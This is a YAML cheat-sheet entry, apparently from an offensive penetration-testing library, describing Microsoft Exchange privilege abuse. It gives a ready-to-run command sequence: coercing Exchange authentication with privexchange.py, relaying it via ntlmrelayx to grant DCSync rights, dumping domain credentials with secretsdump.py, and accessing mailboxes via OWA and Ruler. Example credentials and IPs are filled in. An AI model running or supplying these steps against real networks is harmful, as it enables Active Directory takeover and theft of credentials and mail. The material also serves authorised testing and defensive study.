---
description: |
  Abuse Microsoft Exchange privileges — PrivExchange relay to gain DCSync rights, access OWA mailboxes, and interact with Exchange via Ruler.
commands:
  - have: Credentials
    cmd: |
      # PrivExchange — Exchange server has WriteDacl on domain
      # Coerce Exchange to authenticate to attacker, relay to LDAP

      # Start ntlmrelayx targeting LDAP
      ntlmrelayx.py -t ldap://10.10.10.27 --escalate-user sec_user

      # Trigger Exchange authentication
      python3 privexchange.py -ah 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.sh exchange.senshu.sh

      # After relay succeeds, sec_user has DCSync rights
      secretsdump.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27

      # Enumerate Exchange servers
      nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' --groups | grep -i exchange

      # Access OWA (Outlook Web Access)
      # https://exchange.senshu.sh/owa
      # Try credentials for mailbox access

      # Ruler — interact with Exchange via MAPI/HTTP
      ruler -u sec_user -p 'P@ssw0rd' -d senshu.sh --email sec_user@senshu.sh display
  - have: Shell
    cmd: |
      # From Exchange server itself
      # Exchange has high privileges in AD by default
      # Check Exchange security groups
      net group "Exchange Trusted Subsystem" /domain
      net group "Exchange Windows Permissions" /domain
phase:
  - Exploitation
target_os:
  - Windows
services:
  - HTTP
  - LDAP
techniques:
  - ACL_Abuse
references:
  - https://github.com/dirkjanm/privexchange
  - https://github.com/fortra/impacket
  - https://github.com/sensepost/ruler
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/exchange-abuse.html
---
